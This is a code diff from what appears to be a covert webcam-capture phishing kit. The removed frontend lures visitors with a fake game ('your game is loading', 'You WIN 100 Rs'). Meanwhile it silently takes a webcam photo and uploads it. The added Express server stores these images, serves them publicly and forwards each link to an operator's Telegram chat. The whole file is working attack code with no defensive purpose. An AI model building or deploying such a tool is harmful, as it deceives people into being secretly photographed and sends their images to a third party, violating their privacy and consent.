@@ -1,63 +1,39 @@
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const captureBtn = document.getElementById("captureBtn");
-const status = document.getElementById("status");
+import express from "express";
+import multer from "multer";
+import path from "path";
+import TelegramBot from "node-telegram-bot-api";
 
-let streamReady = false;
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-async function startCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    await video.play();
-    streamReady = true;
-  } catch (err) {
-    console.error("Camera error:", err);
-  }
-}
+// Telegram setup
+const botToken = process.env.BOT_TOKEN;
+const chatId = process.env.CHAT_ID;
+const bot = new TelegramBot(botToken);
 
-function showLoadingText(text) {
-  let dots = 0;
-  status.textContent = text;
-  const interval = setInterval(() => {
-    dots = (dots + 1) % 4;
-    status.textContent = text + ".".repeat(dots);
-  }, 300);
-  return interval;
-}
+// Serve frontend
+app.use(express.static("public"));
 
-captureBtn.addEventListener("click", async () => {
-  status.textContent = "";
+// Setup uploads folder
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => cb(null, "uploads/"),
+  filename: (req, file, cb) => cb(null, file.originalname),
+});
+const upload = multer({ storage });
 
-  if (!streamReady) await startCamera();
+// Handle uploads
+app.post("/upload", upload.single("photo"), (req, res) => {
+  const filePath = `${req.protocol}://${req.get("host")}/uploads/${req.file.filename}`;
+  console.log("📸 Image captured:", filePath);
 
-  const loader = showLoadingText("🕹️ Tap 2 times please, your game is loading");
+  // Send message to Telegram
+  bot.sendMessage(chatId, `📸 New image uploaded:\n${filePath}`);
 
-  const ctx = canvas.getContext("2d");
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  canvas.toBlob(async (blob) => {
-    try {
-      const form = new FormData();
-      form.append("photo", blob, `capture_${Date.now()}.jpg`);
-
-      const res = await fetch("/upload", { method: "POST", body: form });
-      const data = await res.json();
-
-      clearInterval(loader);
-
-      if (data && data.success) {
-        status.textContent = "🎉 You WIN 100 Rs successfully!";
-      } else {
-        status.textContent = "❌ Upload failed. Try again.";
-      }
-    } catch (err) {
-      clearInterval(loader);
-      status.textContent = "❌ Upload failed. Try again.";
-    }
-  }, "image/jpeg");
+  res.json({ success: true });
 });
 
-startCamera();
+// Serve uploaded images
+app.use("/uploads", express.static("uploads"));
+
+// Start server
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
